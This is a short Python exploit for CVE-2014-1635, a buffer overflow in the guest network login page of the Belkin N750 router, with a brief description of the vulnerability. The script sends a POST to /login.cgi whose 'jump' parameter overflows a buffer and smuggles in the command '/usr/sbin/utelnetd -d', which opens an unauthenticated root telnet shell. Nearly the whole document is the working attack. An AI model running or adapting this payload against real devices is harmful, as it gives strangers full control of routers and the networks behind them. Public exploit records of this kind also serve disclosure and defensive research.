"""
Source: https://labs.integrity.pt/articles/from-0-day-to-exploit-buffer-overflow-in-belkin-n750-cve-2014-1635/

A vulnerability in the guest network web interface of the Belkin N750 DB Wi-Fi Dual-Band N+ Gigabit Router with firmware F9K1103_WW_1.10.16m, allows an unauthenticated remote attacker to gain root access to the operating system of the affected device. The guest network functionality is default functionality and is delivered over an unprotected wifi network.

Successful exploitation of the vulnerability enables the attacker to gain full control of the affected router.

"""
#!/usr/bin/python
#Title : Belkin n750 buffer overflow in jump login parameter
#Date : 28 Jan 2014
#Author : Discovered and developed by Marco Vaz <mv@integrity.pt>
#Testd on: Firmware: 1.10.16m (2012/9/14 6:6:56) / Hardware : F9K1103 v1 (01C)

import httplib

headers = {}
body= “GO=&jump=”+ “a”*1379 +”%3b”+ “/usr/sbin/utelnetd -d” +”%3b&pws=\n\n”
conn = httplib.HTTPConnection(“192.168.169.1″,8080)
conn.request(“POST”, “/login.cgi”, body, headers)
response = conn.getresponse()
data = response.read()
print data